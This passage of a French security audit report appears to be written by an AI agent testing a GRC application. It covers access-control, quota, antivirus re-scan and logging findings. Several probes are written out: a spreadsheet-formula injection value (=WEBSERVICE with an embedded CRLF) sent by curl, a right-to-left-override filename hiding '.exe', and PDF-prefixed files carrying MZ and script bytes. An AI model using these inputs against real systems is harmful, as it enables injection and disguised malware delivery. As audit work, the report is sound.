                          select count(*) as filiales_vues from filiales; commit;"
 filiales_vues
 -------------
             0

-- …et la fonction « security definer » l'ouvre :
$ psql -U grc_lecture -c "select * from f_filiales_actives();"
                         id                         | code |         raison_sociale
----------------------------------------------------+------+--------------------------------
 FIL-1788477623977-cacccd29470b497baa178f1f1a229f36 | DEU  | Dedienne Aerospace Deutschland
 FIL-1788477623975-5208b3f525954fffb228d9aa292ec1cf | TLS  | Dedienne Aerospace Toulouse
```

**Pourquoi ce n'est pas un détail.** Ce n'est pas la fuite de Q-132 — trois colonnes, ni
adresse, ni téléphone, ni courriel — et `grc_lecture` n'est pas une filiale. Mais :

1. c'est **exactement la forme** que le §32 nomme : *l'existence d'une filiale peut précéder
   son annonce*, le groupe faisant des acquisitions régulières. La **liste des filiales
   actives du groupe** est précisément ce qu'un compte de supervision cloisonné ne doit pas
   déduire ;
2. la migration **déclare** une surface étroite et n'en pose pas la clôture. Son propre
   commentaire dit *« une exemption écrite dans `pol_filiales_lecture` s'appliquerait à
   TOUTE requête de la transaction ; celle-ci rend trois colonnes et rien d'autre »* — vrai
   des colonnes, faux des appelants ;
3. c'est **le même compte** qui a servi à réfuter le report de la condition E6 : le
   `CLAUDE.md` §8 écrit que *« `grc_lecture` lit 138 entrées du journal »* et en tire, à
   juste titre, que l'argument « sans effet tant que c'est vide » ne tient pas. Le même
   raisonnement s'applique ici.

**Correctif** : une ligne, `revoke execute on function f_filiales_actives() from public;`,
dans une migration `011` (le §23 interdit de réécrire `010`). Le garde-fou correspondant
n'existe pas : `f_verifier_lecture_filiales()` vérifie la politique et le `security
definer` de `f_perimetre_groupe()`, **jamais les droits d'exécution**.

**Rejeu** : les trois commandes `psql` ci-dessus, plus la lecture de `proacl`.

---

### 🔵 Q-137 — `nommerFiliale()` est mort depuis `010`, et le banc est vert

**Classe : tout le reste (`V1.1`).**

`src/api/index.ts:1169` lit `filiales` sous `PERIMETRE_SYSTEME` :

```ts
const nommerFiliale = async (id) => {
  const ligne = await avecTransaction(pool, PERIMETRE_SYSTEME, async (client) => {
    const { rows } = await client.query(`select "code", "raison_sociale" from "filiales" where "id" = $1`, [id]);
    return rows[0];
  }, { lectureSeule: true });
  return { id, code: ligne?.code ?? null, raison_sociale: ligne?.raison_sociale ?? null };
};
```

et sa docstring justifie ce périmètre par une phrase **rendue fausse par la migration du
même jour** :

> *« Le périmètre système suffit et ne donne accès à aucune donnée métier : `filiales` est
> de niveau Groupe, **sa lecture est ouverte** (`004_rls.sql` §6)… »*

`PERIMETRE_SYSTEME` déclare `filiales: []` et `perimetreGroupe: false` (`src/db/pool.ts:136`).
Sous la politique de `010`, la requête tombe donc dans la branche
`id = any(f_filiales_lecture())` avec un périmètre vide : **zéro ligne, sans erreur**. Le
`?? null` transforme le rien en réponse.

**Mesuré sur le service réel** — le chemin « le choix est déjà celui de la session » :

```
$ curl -b tls -X PUT .../api/session/filiale-active -d '{"filiale":"<sa propre filiale>"}'
200 {"change":false,"filiale_active":{"id":"FIL-1788477623975-…","code":null,"raison_sociale":null}}
```

C'est **le constat Q-104 dans sa forme la plus pure** : un zéro qui ne distingue pas
« absente » de « non lisible », et qui devient une réponse d'API muette. Et c'est **Q-85
qui manque de rouvrir** — le commit de `010` se félicite d'avoir attrapé deux lecteurs de
`src/auth/sessions.ts` « en rendant la session sans nom de filiale » ; celui-ci est passé
au travers, parce qu'aucun essai n'appelle ce chemin.

**Portée réelle : nulle aujourd'hui, et c'est de la chance.** `js/app.js:494` court-circuite
le cas (`if (!filialeChoisie || filialeChoisie === session.filialeId) return false;`) et
relit `GET /api/session` plutôt que de croire la réponse. Le seul appelant de
`nommerFiliale` est donc inatteignable depuis le produit — mais la fonction reste, et elle
ment.

---

### 🔵 Q-138 — Le quota de filiale : une pièce en quarantaine que **personne ne peut nommer**, une borne franchissable, une mesure qui ignore le disque

**Classe : tout le reste (`V1.1`).** Trois défauts d'un même mécanisme.

**(a) La quarantaine consomme le quota, et son identifiant n'est jamais rendu.**
`src/pieces/depot.ts:250-254` promet :

> *« Le `delete` n'exclut pas les pièces en quarantaine : une pièce infectée doit pouvoir
> être retirée, **sans quoi le quota d'une filiale se remplirait de choses que personne ne
> peut effacer**. »*

Le `delete` ne les exclut effectivement pas. **Mais aucune route ne révèle jamais leur
identifiant** : le dépôt infecté insère la ligne puis lève un **400 sans identifiant** ; la
liste et la délivrance filtrent sur `CONDITION_DELIVRABLE` ; `exploitation.ts` n'expose
aucune route. Mesuré :

```
-- après le dépôt d'un EICAR par rssi.tls :
PJ-1788524358215-… | eicar.txt | txt | 68 | infectee | t | Eicar-Test-Signature
volume total filiale (quota) : 1162 o     ← les 68 o de l'EICAR y sont
délivrables                  : 16         ← la pièce n'y est pas

$ curl -b tls .../api/pieces/documents/DOC-SONDE          → la pièce n'apparaît pas
$ curl -b tls .../api/pieces/documents/DOC-SONDE/<son id> → 404
$ curl -b tls -X DELETE .../api/pieces/documents/DOC-SONDE/<son id> → 204   (identifiant obtenu EN BASE)
```

Elle est donc **effaçable et innommable** : le scénario que le commentaire déclare avoir
écarté est exactement celui qui se produit. Le seul recours est la lecture du journal
d'audit — un droit que le déposant n'a pas.

**(b) La borne est franchissable par concurrence.** Le contrôle n° 2 est une lecture
`{ lectureSeule: true }` **committée**, sans verrou ni `for update`
(`src/pieces/index.ts:478-484`), et l'insertion en est séparée par l'écriture, l'empreinte
**et l'aller-retour ClamAV**, borné à `clamavDelaiMs` (défaut **30 s**). N requêtes
simultanées lisent le même `sum(taille_octets)`, passent toutes, et insèrent toutes. Le
dépassement maximal est de `N × PJ_TAILLE_MAX`. *Lu, non mesuré : le quota par défaut est
de 2 Gio et la démonstration aurait exigé de fabriquer 2 Gio sur la recette.*

**(c) La mesure ignore le disque.** `volumeFiliale()` somme des **lignes**. Ne sont comptés
ni les fichiers orphelins du magasin (promotion réussie, insertion échouée — le `catch` de
`index.ts:651` est d'ailleurs **muet**, contrairement à son symétrique de la suppression qui
journalise), ni les résidus d'attente après un arrêt brutal, ni les fichiers de quarantaine
dont la ligne a été supprimée : ceux-là sont **délibérément** laissés sur le disque
(`index.ts:827`, « la matière de l'équipe sécurité »), sans qu'aucun compteur ne les suive
et sans aucune rétention.

Enfin, sur le même mécanisme : **rien ne confronte `:entiteId` à quoi que ce soit**. Mesuré :

```
$ curl -b tls -X POST .../api/pieces/documents/DOC-INEXISTANT-123 -F 'fichier=@sain.pdf'
201 {"id":"PJ-…","entite_type":"documents","entite_id":"DOC-INEXISTANT-123", …}
```

Le rattachement est polymorphe et sans clé étrangère : une pièce attachée à un
enregistrement supprimé (ou jamais créé) reste en base, sur le disque, et dans le quota,
sans qu'aucune cascade ne la récolte.

---

### 🔵 Q-139 — La ré-analyse périodique **affame** les filiales par ordre alphabétique

**Classe : tout le reste (`V1.1`).**

`src/pieces/exploitation.ts` :

```ts
for (const filiale of filiales) {          // f_filiales_actives() → order by code
  if (examinees >= limite) break;          // limite = LIMITE_REANALYSE_PAR_DEFAUT = 500
  …
  [filiale.id, seuil, limite - examinees], // le budget est GLOBAL
```

Le commentaire promet :

> *« un stock plus profond que cette limite se rattrape sur plusieurs jours plutôt qu'en une
> seule transaction géante — `order by derniere_reanalyse nulls first` fait que les pièces
> les plus négligées passent toujours en premier »*

C'est vrai **à l'intérieur** d'une filiale et faux **entre** filiales. Si la filiale
alphabétiquement première porte en permanence ≥ 500 pièces échues, `examinees` atteint la
limite avant la deuxième itération, et **les filiales suivantes ne sont jamais
ré-analysées** — indéfiniment, sans que rien ne le signale : le bilan (`:465-470`) compte ce
qui a été examiné, jamais ce qui reste dû.

Sur un groupe de 20+ filiales, avec un quota de 2 Gio chacune, c'est le régime nominal dès
que le stock grossit. Le cycle annoncé de 90 jours (`DELAI_REANALYSE_JOURS_PAR_DEFAUT`)
plafonne à 500 × 90 = **45 000 pièces**, tous quotas confondus, et s'allonge en silence
au-delà.

*Lu, non mesuré : la recette porte 20 pièces, aucune n'atteint le seuil.*

---

### 🔵 Q-140 — La ré-analyse n'écrit **rien** dans le journal d'audit

**Classe : tout le reste (`V1.1`).**

```
$ grep -rn "journaliser" backend/src/pieces/
src/pieces/index.ts:158:import { journaliser } from '../auth/journal.js';
src/pieces/index.ts:400:    await journaliser(client, {
src/pieces/index.ts:536:        await journaliserAnalyseImpossible(…)
src/pieces/index.ts:670:  const journaliserAnalyseImpossible = async (…)
$ grep -n "journaliser\|journal_audit" backend/src/pieces/exploitation.ts
(rien)
```

Une mise en quarantaine **découverte par la ré-analyse** — c'est-à-dire une pièce qui a été
délivrable pendant des mois et qui devient une menace détectée, l'événement de sécurité le
plus tardif et le plus intéressant de tout L6 — n'est portée que par un `journal?.warn`
vers journald. Elle **n'entre pas** dans `journal_audit`, alors que la même mise en
quarantaine par la chaîne d'ingestion y entre (mesuré : 18 entrées `analyse_antivirus`
pendant l'audit).

C'est en tension directe avec le `PLAN_SERVEUR` §1.7 (rétention 3 ans, chaînage) et avec le
lot L5 qui vient de fermer la couverture. Journald n'est ni inaltérable, ni chaîné, ni
conservé trois ans.

---

### 🔵 Q-141 — Le garde-fou anti-Q-89 valide désormais **la longueur d'une prose**

**Classe : tout le reste (`V1.1`).**

`test/depot/entonnoir-export.test.mjs` est le seul filet mécanique contre une récidive du
constat Q-89 (un compte sans droit d'export téléchargeant 38 213 octets d'un document
confidentiel). Le commit `664c6dc` y ajoute une exemption **par fichier** :

```js
if (SORTIES_QUI_NE_SONT_PAS_DES_EXPORTS.some((e) => e.fichier === relatif)) continue;   // :178
```

`js/modules/pieces.js` y figure **en entier**. Le seul verrou est l'essai voisin, dont le
nom affirme une propriété de sécurité :

```js
test('CHAQUE sortie non-export est motivée, et dit ce qui la garde', …
  if (!e.pourquoi  || e.pourquoi.length  < 40) incomplets.push(`${e.fichier} — motif absent ou creux`);
  if (!e.gardePar  || e.gardePar.length  < 40) incomplets.push(`${e.fichier} — ne dit pas ce qui le garde`);
```

**Il vérifie que deux chaînes font au moins 40 caractères.** La garde revendiquée — « la
route déclare `action: lire`, le périmètre et la RLS s'appliquent, chaque délivrance est
tracée » — n'est mesurée nulle part dans ce fichier. Un export en masse ajouté demain à
`js/modules/pieces.js` héritera de l'exemption sans un mot.

Deux aggravations dans le même fichier :

- **Le bloc JSDoc qui précède la liste dit l'inverse de ce que la liste est.** Deux blocs se
  succèdent devant une seule constante ; le premier, resté de `SORTIES_DELEGUEES`, affirme :
  *« Ce qui serait le mauvais outil, ce serait une liste des fichiers **exemptés** :
  celle-là, incomplète, ferait réussir quelque chose en silence. »* Il surplombe désormais
  `SORTIES_QUI_NE_SONT_PAS_DES_EXPORTS`, qui est très exactement cette liste.
- **Le contrôle de matière ne voit pas l'érosion** : `sitesVus += 1` est incrémenté
  **avant** le `continue` d'exemption (`:174` puis `:178`), si bien que
  `assert.ok(sitesVus >= 5)` compterait cinq fichiers **vus** même si les cinq étaient
  exemptés.

⚠️ **Je ne conteste pas l'arbitrage du §31.5** — voir §5. Ce que je conteste est que la
garde construite pour empêcher un second Q-89 porte maintenant une porte dont le seul
verrou est un compte de signes.

---

### 🔵 Q-142 — La famille `test/pieces/` est **aveugle** au débranchement de la couture, et `aide.mjs` affirme le contraire

**Classe : tout le reste (`V1.1`).**

`test/pieces/aide.mjs:155-156` monte lui-même les routes que le point d'entrée n'aurait pas
montées :

```js
const coutureBranchee = routes.length > 0;
if (!coutureBranchee) await greffonPieces(instance, { pool, config });
```

L'entête du fichier affirme que ce n'est pas un risque, parce que
*« `test/pieces/ingestion.test.mjs` dit alors, par le nombre de routes, laquelle des deux
situations elle a rencontrée »*. **C'est faux deux fois** : `coutureBranchee` est exporté
(`:166`) et n'est **lu nulle part** (`grep -rn coutureBranchee` ne rend que ces trois
lignes) ; et le crochet `onRoute` est posé avant les deux branches, si bien que
`assert.equal(declarees.length, 8)` vaut la même chose dans les deux cas.

**Mesure par mutation** — j'ai remis `src/api/index.ts:2425` dans l'état que le dépôt
documente comme ayant été observé le 04/09 (`register(greffonPieces, { pool })`, sans
`config`), c'est-à-dire un produit **sans aucune route de pièce jointe** :

```
$ node --test "test/pieces/**/*.test.mjs"
ℹ tests 83   ℹ pass 83   ℹ fail 0
```

**83 essais verts sur un produit qui n'a pas la fonctionnalité qu'ils prétendent
mesurer.**

⚠️ **Et voici la moitié qui corrige le constat, parce qu'elle compte** : le **banc entier**,
lui, mord. Sur la même mutation :

```
$ npm test
ℹ tests 1285   ℹ pass 1281   ℹ fail 4
  test/api/routes.test.mjs · test/modules/non-regression.test.mjs · test/navigateur/pieces.test.mjs
```

La régression est donc attrapée — par trois autres familles, dont celle du navigateur. Le
constat porte sur la **famille** et sur l'**affirmation fausse** de son entête, pas sur le
banc. *(Mutation restaurée par `git checkout -- src/api/index.ts` ; fichier vérifié
identique à l'octet près à sa sauvegarde, arbre propre.)*

---

### 🔵 Q-143 — L4 ouvre deux écritures **non bornées** dans le journal en ajout seul, dont une porte une valeur choisie par le client

**Classe : tout le reste (`V1.1`).** Prolonge **Q-122**, qui reste ouvert.

Le limiteur de rythme ne compte **que** les refus d'identité (401) — un `403` n'est jamais
freiné (`src/api/index.ts`, étape 3). Or L4 ajoute deux chemins qui écrivent au journal
**sur refus** :

1. l'étape 3 bis, sur **toutes** les routes — donc sur le sondage `GET /api/rafraichir`,
   que la SPA émet toutes les **20 secondes** (`SONDAGE_MS = 20000`, `js/core/sync.js:72`) :
   une session dont la filiale active a quitté le périmètre écrit ainsi ~4 320 entrées
   définitives par jour, sans que l'utilisateur puisse rien y faire ;
2. le refus du sélecteur, qui porte en plus **la valeur demandée telle que reçue**.

Mesuré :

```
$ for i in $(seq 1 30); do curl -b tls -X PUT .../api/session/filiale-active -d '{"filiale":"<DEU>"}'; done
403 403 403 … (30 fois, aucun ralentissement)
→ 33 entrées « refus_autorisation / filiale_hors_perimetre » en base

$ curl -b tls -X PUT … -d '{"filiale":"=WEBSERVICE(\"http://x\")\r\nX"}'   → 403
$ curl -b tls -X PUT … -d '{"filiale":"AAAA-audit-S5-charge-64-signes-0123456789012345678901234567"}' → 403

323 :: AAAA-audit-S5-charge-64-signes-0123456789012345678901234567
322 :: =WEBSERVICE("http://x")
X                                    ← le saut de ligne est arrivé LITTÉRALEMENT en base
```

Un compte authentifié peut donc écrire à volonté des chaînes de 64 signes de son choix dans
une table que **rien dans l'application ne purge**, avec un saut de ligne dedans. Chaîné à
**Q-120**, il porte le journal au-delà du plafond d'export en quelques minutes, après quoi
tout extrait d'audit est refusé.

⚠️ **Ce qui tient malgré tout, et qu'il faut dire** : l'export CSV **n'est pas** vulnérable
ici. La valeur voyage dans l'objet `valeurs_apres`, dont la cellule CSV commence par `{`, et
le CRLF y est encodé en JSON. Vérifié sur l'extrait réel — la ligne n'est ni scindée ni
évaluable. Le correctif de **Q-121** n'avait pas à couvrir ce champ, et il n'avait pas à
être élargi.

---

### 🔵 Q-144 — Le §31.5 tire **trois** conséquences côté navigateur, et les trois sont fausses

**Classe : tout le reste (`V1.1`).**

`CONVENTIONS.md` §31.5, dernier paragraphe :

> ⚠️ **Conséquence côté navigateur, et c'est mieux ainsi** : l'écran **ne fabrique plus** le
> téléchargement. Il suit l'adresse, et le serveur délivre en `attachment` + `nosniff`.
> Donc **(a)** un fichier de 25 Mio ne transite plus par la mémoire du navigateur, **(b)** le
> nom écrit sur le disque vient de l'en-tête assaini par le serveur, et **(c)** le garde-fou
> mécanique de l'entonnoir cesse d'accuser ce chemin **parce qu'il n'y a plus rien à
> accuser** — par disparition de l'objet, jamais par une exemption.

Le code livré dans le **même commit** (`js/modules/pieces.js:451-462`) :

```js
const blob = await Api.telechargerPiece(entiteType, entiteId, pieceId);
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url;
a.download = (piece && piece.nom_fichier) ? piece.nom_fichier : "piece-jointe";
```

- **(a) faux** : le fichier transite intégralement par la mémoire du navigateur. Le code le
  dit d'ailleurs lui-même, et **avec une bonne raison** (« sur un refus, le navigateur
  QUITTE L'ÉCRAN pour afficher le JSON d'erreur ; on perdrait la saisie en cours ») — c'est
  le contrat qui n'a pas été mis à jour, pas le code qui a mal fait.
- **(b) faux** : le nom écrit sur le disque vient de `piece.nom_fichier`, c'est-à-dire de la
  **liste JSON**, donc de la valeur du déposant telle que stockée — **pas** de l'en-tête
  `Content-Disposition` que le serveur assainit. Tout le soin de `dispositionAttachement()`
  (liste blanche ASCII + RFC 5987) est court-circuité sur le chemin réel.
- **(c) faux** : l'objet n'a pas disparu — un `<a download>` est bien fabriqué —, et le
  garde-fou ne cesse pas d'accuser « par disparition » mais **par une exemption écrite à la
  main**, celle du constat **Q-141**. Le §31.5 dit exactement le contraire de ce que le
  dépôt contient.

Sur le fond, cela laisse passer les caractères que `normaliserNomFichier` ne retire pas :
mesuré, un dépôt nommé `fact‮fdp.exe.pdf` est **accepté** et stocké tel quel
(l'inversion d'affichage U+202E survit au filtre `[ --]`), et c'est
cette chaîne-là, non l'en-tête assaini, qui atterrit sur le poste du lecteur. La liste
blanche d'extensions a le dernier mot sur ce que le fichier **est** ; l'affichage du nom,
lui, ment.

---

### 🔵 Q-145 — La documentation d'état livrée avec la vague 4 décrit l'état d'**avant** la vague 4

**Classe : tout le reste (`V1.1`).** **Dixième occurrence de la famille Q-4**, après Q-90 et
Q-124 — les deux fois sur le même fichier, les deux fois le jour de la livraison.

Sur la révision auditée, alors que L4 et L6 sont **livrés, déployés et servis par la
recette** :

| Où | Ce qui est écrit | Ce qui est vrai |
|---|---|---|
| `backend/README.md:744` | « **L4 → L15 ⬜ à faire** » | L4 et L6 sont livrés ; `PUT /api/session/filiale-active` et les huit routes de pièces jointes répondent sur `https://grc.exemple.interne/` |
| `backend/README.md:1472` | « Le lot **L6** (pièces jointes) **recettera** sa chaîne d'analyse antivirale sur le… » | Elle est recettée : EICAR détecté, mis en quarantaine, `Eicar-Test-Signature` en base |
| `backend/README.md:1501` | « `analyse_antivirus` **reporté au lot L6** » | L6 l'émet : **18 entrées** mesurées pendant l'audit |
| `backend/README.md:97` | « c'est le sélecteur de filiale du lot L4 qui **le lui rendra** » | Il le lui rend déjà |
| `CHANGELOG.md`, `[Non publié]` | La dernière entrée est **L5** | Aucune entrée pour L4 ni pour L6 |

**Et le chiffre normatif que Q-127 venait de fixer est déjà périmé.** Le `README` et le
`CHANGELOG` disent « **16 émissibles sur 20** ». Mesuré sur la base de recette :

```
ck_journal_audit_action : 21 valeurs   (009 ajoute « changement_perimetre »)
actions réellement observées : 14 distinctes, dont « analyse_antivirus » et « changement_perimetre »
```

Le dénominateur a changé (20 → 21) et le numérateur aussi (16 → 18 au moins). Q-127 avait
conclu qu'*« un chiffre qui vit à deux endroits finit par n'en dire qu'un vrai »* et fixé le
chiffre normatif ; **une vague plus tard, il est faux, et rien ne le confronte au réel** —
c'est le garde-fou manquant que Q-124 nommait déjà.

Enfin, `db/CONVENTIONS.md` §24 dit toujours « **Dix** tables du schéma n'ont pas de politique
cloisonnante » alors que `010` en a retiré une (`filiales`). Les **deux** endroits que le §24
désigne comme faisant foi ont bien été corrigés (`rls.test.mjs` et le contrôle C93) ; c'est
la prose qui les explique qui ne l'a pas été.

---

### 🔵 Q-146 — On peut déposer un logo de filiale ; on ne peut pas le **désigner**

**Classe : tout le reste (`V1.1`).**

```
$ grep -rn "logo_piece_jointe_id" backend/src/ cyber-gouvernance_V4/
(aucun résultat)
```

`001_socle.sql` porte une clé étrangère composite soignée
(`(logo_piece_jointe_id, id) → (id, filiale_id)`, `on delete restrict`) et quarante lignes de
commentaire. **Rien, dans le produit, ne l'écrit jamais.** Mesuré après un dépôt réussi par
`admin.grc` :

```
logo_piece_jointe_id = NULL          (les deux filiales)
pieces entite_type='filiales' : 1
```

`POST /api/pieces/logo` crée une pièce et s'arrête là : ni désignation, ni remplacement, ni
unicité — N dépôts donnent N logos et aucun n'est *le* logo. Conséquence pour le
`PLAN_SERVEUR` §6 (« logo et raison sociale configurables par filiale ») : la moitié
« configurable » manque.

Corollaire de conception à trancher : `GET /api/pieces/logo` exige
`{ action: 'lire', domaine: 'administration' }`. Un utilisateur ordinaire **ne peut donc pas
afficher le logo de sa propre filiale** — mesuré, `rssi.tls` reçoit 403 — alors que c'est
précisément l'usage attendu.

---

### Observation — ce que la découverte sur `/api/donnees` implique, et qui n'est pas un défaut

Le commit annonce : *« `/api/donnees` est cadré sur la filiale ACTIVE, pas sur le périmètre
de lecture »*. C'est exact — `Depot.chargerJeuDeDonnees()` appelle `this.filialeActive(perimetre)`
et rend `perimetre.filialeId` — et **ce n'est pas une fuite : c'est une restriction.**
Mesuré avec `rssi.groupe` (périmètre TLS + DEU) :

```
active = DEU  → volumes non nuls : {actions: 1}
active = TLS  → volumes non nuls : {actions: 3, risques: 2, audits: 1, history: 2, personnes: 5}
```

`/api/rafraichir` suit la même règle : après bascule vers DEU, le sondage rend
`ACT-SONDE-DEU` et **plus rien de TLS**. Aucun résidu de la filiale quittée, aucun cache.

Ce qu'il faut en écrire, sans en faire un constat : **la « vision Groupe consolidée pour la
direction » — une décision structurante validée (`CLAUDE.md` §8) — n'existe pas dans le
chargement du jeu de données.** La Direction voit une filiale à la fois, et rien ne
consolide. C'est un écart de **portée fonctionnelle**, à porter au plan plutôt qu'au
registre des défauts.

---

## 4. Ce que je n'ai pas pu vérifier

**Impossible sur cette machine :**

| Quoi | Pourquoi |
|---|---|
| **Arrêter ou ralentir `clamd` pour éprouver la chaîne en production** | `sudo` exige un mot de passe (`sudo -n -l` → « a password is required »). Le comportement en cas de démon muet, lent, ou qui répond n'importe quoi n'a donc **pas** été mesuré par moi sur le service réel. Le code de `dialoguer()` pose un délai de garde, un garde `termine` et un `nettoyer()` sur tous les chemins, et `test/pieces/antivirus.test.mjs` couvre ces cas au banc — mais je ne l'ai pas remesuré, et je ne l'écris donc pas comme acquis. |
| **Le dépassement de quota par concurrence (Q-138 b)** | Le quota par défaut est de 2 Gio ; le démontrer aurait exigé de fabriquer 2 Gio sur la recette. Le mécanisme est **lu**, pas mesuré. |
| **La famine de la ré-analyse (Q-139)** | Exige ≥ 500 pièces échues dans une filiale. La recette en portait 20. Mécanisme **lu**, pas mesuré. |
| **Le premier passage réel du timer** | Il n'a jamais tourné (`LAST` vide, prochain passage le 05/09 à 00:22 UTC), et le déclencher exige `sudo`. |

**Non tenté, délibérément :**

- **Faire échouer le service de recette en production.** Q-135 est démontré sur le point
  d'entrée réel de la ré-analyse, lancé sous mon compte avec un magasin de substitution —
  jamais en provoquant la mort du service `cyber-grc`, qui aurait coupé les sessions en
  cours.
- **Toute tentative supplémentaire sur un compte AD.** Le verrouillage est à 5 essais ; je
  n'ai employé que les trois mots de passe fournis, tous du premier coup.
- **Créer des comptes ou des groupes dans `grc-ad`.** Le brief l'autorise ; je ne l'ai pas
  fait, les trois comptes existants couvrant les trois axes dont j'avais besoin (une
  filiale / Groupe+export / journal+export+administration).
- **Rejouer S4 (verrouillage optimiste) et l'inaltérabilité du journal.** Hors surface
  L4/L6, mordus à la porte S4 ; marqués sans objet, jamais « passés ».
- **Éprouver le relais SMTP et l'AD de production** : hors de portée, comme aux portes
  précédentes.

---

## 5. Ce que j'ai cru et qui était faux

Cette section est celle qui coûte le plus à écrire et qui rapporte le plus à lire. **Sept
erreurs**, dont trois m'auraient fait écrire un constat faux ou surclassé.

**1. « La famille `test/pieces/` est aveugle, donc le banc est aveugle. » — faux, et c'est
la correction la plus importante du rapport.**
J'avais la mutation, j'avais le `83/83` vert, et j'ai failli écrire « majeur : la régression
du 04/09 repasserait sans qu'un seul essai rougisse ». J'ai lancé le **banc entier** sur la
même mutation avant d'écrire : **1281/1285, quatre échecs**, dans `test/api/routes.test.mjs`,
`test/modules/non-regression.test.mjs` et `test/navigateur/pieces.test.mjs`. Le constat
existe (Q-142) mais il porte sur la famille et sur une affirmation fausse de son entête, pas
sur le banc. *Comment je m'en suis aperçu* : en refusant de conclure d'une mesure partielle
à une propriété globale — c'est-à-dire en appliquant à ma propre mesure le corollaire 1.

**2. « Un essai de lecture m'a rapporté un défaut ; je peux le reprendre. » — non, et j'ai
failli le faire trois fois.**
J'ai fait lire les fichiers de L6 et les essais de la vague par des passes de lecture
séparées, et **trois** de leurs conclusions ne survivent pas à la mesure : le prétendu
« aveuglement du banc » (ci-dessus), un « `interpreter()` qui déclare saine une réponse
contenant `FOUND` » (vrai en laboratoire, mais `dialoguer()` règle dès le premier octet nul,
donc inatteignable avec un vrai clamd — je ne l'ai pas retenu), et un classement en
« bloque le fonctionnement » du dépassement de quota, qui n'est pas un blocage mais une
borne molle. **Rien n'entre dans ce rapport que je n'aie mesuré moi-même, ou que je ne
signale explicitement comme lu.**

**3. « `npm audit` n'est pas jouable ici. » — faux, et huit passages de porte l'avaient
reconduit.**
Le rapport S4 écrit noir sur blanc : « `npm audit --omit=dev` **n'est pas jouable ici** :
pas de réseau sortant (deux tentatives, expiration à 120 s et 100 s) ». J'allais recopier la
réserve. Je l'ai essayée : **réponse immédiate, « found 0 vulnerabilities », exit 0**. Le
constat Q-128 l'avait déjà dit — la machine n'est pas hors ligne, un seul point d'accès npm
rendait 503 — et personne n'avait rejoué le contrôle depuis. *Une réserve écrite n'est pas
une réserve traitée*, huitième démonstration.

**4. « Le contournement de la signature binaire est un constat. » — non, c'est le contrat.**
J'ai déposé `%PDF-1.4\nMZ\x90… <script>` en `.pdf` : **accepté**. Puis un EICAR précédé de
`%PDF-1.4\n` : **accepté, `etat_analyse: saine`, `resultat_analyse: "stream: OK"`**. J'ai
d'abord cru tenir un défaut de la chaîne. **Faux** : ClamAV a bien analysé le fichier et l'a
déclaré propre — la signature EICAR n'est reconnue que sur le fichier exact —, et le §31.4
écrit d'avance que *« aucun dispositif ne garantit l'absence de malware »*. Un préfixe
valide suivi de n'importe quoi passe, par construction, pour les trois types reconnus aux
octets de tête. Ce n'est pas un constat, c'est la portée exacte du contrôle n° 4, et elle
est écrite.

**5. « Le `filiale_demandee` du refus va faire un second Q-121. » — faux, et c'est
rassurant.**
J'ai forgé une filiale demandée valant `=WEBSERVICE("http://x")\r\nX`, mesuré qu'elle
atterrit **littéralement** en base, saut de ligne compris, et j'étais prêt à écrire que
l'extrait CSV allait la servir à Excel. J'ai exporté avant d'écrire : la valeur vit dans
`valeurs_apres`, dont la cellule commence par `{`, et le CRLF y est encodé par la
sérialisation JSON. **La ligne n'est ni scindée ni évaluable.** La ligne 107 du même extrait
montre au contraire l'ancien chemin, celui de Q-121, correctement désamorcé par
l'apostrophe. *Comment je m'en suis aperçu* : en ouvrant le fichier au lieu de raisonner sur
le champ.

**6. « `nommerFiliale` rend `null` : le sélecteur est cassé à l'écran. » — faux de moitié.**
J'ai mesuré `{"change":false,"filiale_active":{"id":"…","code":null,"raison_sociale":null}}`
et j'ai cru tenir une régression visible. **Elle ne l'est pas** : `js/app.js:494` refuse la
bascule vers la filiale déjà active avant tout appel, et relit `GET /api/session` plutôt que
de croire la réponse de la route. Le chemin est mort. Le constat reste (Q-137) parce que la
fonction ment et que sa docstring justifie son périmètre par une propriété que la migration
du même jour a supprimée — mais il est classé `V1.1`, pas plus.

**7. « `f_perimetre_groupe()` exécutable par PUBLIC est un second Q-136. » — non.**
Son `proacl` est nul, donc PUBLIC a bien `EXECUTE`. Mais elle ne fait que lire un réglage de
session : elle ne rend aucune donnée à qui n'en a pas déjà. J'ai vérifié avant d'écrire, et
je ne l'ai pas retenue. La différence avec `f_filiales_actives()` est qu'une seule des deux
**rend des lignes d'une table cloisonnée**.

---

## 6. Ce que j'ai touché, et rendu

Conformément au périmètre d'écriture, je n'ai créé qu'un fichier : **ce rapport**. Deux
sabotages temporaires, tous deux restaurés et vérifiés :

| Sabotage | Objet | Restauration, vérifiée |
|---|---|---|
| `src/api/index.ts:2425` — `register(greffonPieces, { pool })` au lieu de `{ pool, config }` | Mesurer si `test/pieces/` voit le débranchement de la couture (Q-142) | `git checkout -- src/api/index.ts`, puis `diff` avec une sauvegarde prise avant : **identique**. `git status --porcelain` vide. `npm run verifier-types` → 0. |
| `delete from session_filiales where session_id=… and filiale_id=…` sur **trois** sessions de sonde | Mesurer l'étape 3 bis (§1.5) et la perte de saisie (Q-134) | Lignes réinsérées, les **trois** sessions de sonde révoquées (`motif_revocation` portant « audit S5 » ; compté en base : 3). Vérifié : **0** session ouverte dont la filiale active manque à son périmètre. |

**Données laissées sur la recette** : 22 pièces jointes créées pendant l'audit (21 saines,
1 mise en quarantaine), **toutes supprimées par l'API** — 22 entrées `suppression` en base,
`select count(*) from pieces_jointes` → **0**. Le
fichier de la pièce EICAR reste en quarantaine sur le disque, par construction
(`src/pieces/index.ts:827`) ; il porte la signature `Eicar-Test-Signature` et est inoffensif.

**Le journal d'audit a grossi de 137 entrées** (`max(numero)` passé de 232 à 369 : dépôts,
suppressions, refus, bascules, consultations). Elles sont **définitives** — c'est la propriété du lot L5 — et elles portent
toutes `rssi.tls`, `rssi.groupe` ou `admin.grc` avec l'adresse `127.0.0.1`. Deux d'entre
elles contiennent volontairement les charges d'essai de Q-143.

**Rien d'autre** : aucune base `grc_essai_*` créée par moi (la seule présente,
`grc_essai_morsure_fe4l_1_e165c77d`, préexistait à mon audit), aucun processus Node ou
Chromium laissé en vie, aucun fichier hors du répertoire de travail temporaire.

---

## 7. En une phrase

**Les deux invariants que cette vague devait tenir sont tenus** — le périmètre ne vient
jamais du navigateur, et les huit contrôles s'exécutent dans l'ordre — ; ce qui a cédé, ce
sont les bords : un code d'erreur mutualisé qui fait **détruire par le navigateur la saisie
de l'utilisateur** dans le scénario même que L4 existe pour couvrir, un gestionnaire
d'erreur posé une ligne trop bas qui fait **mourir le processus** sur un fichier illisible,
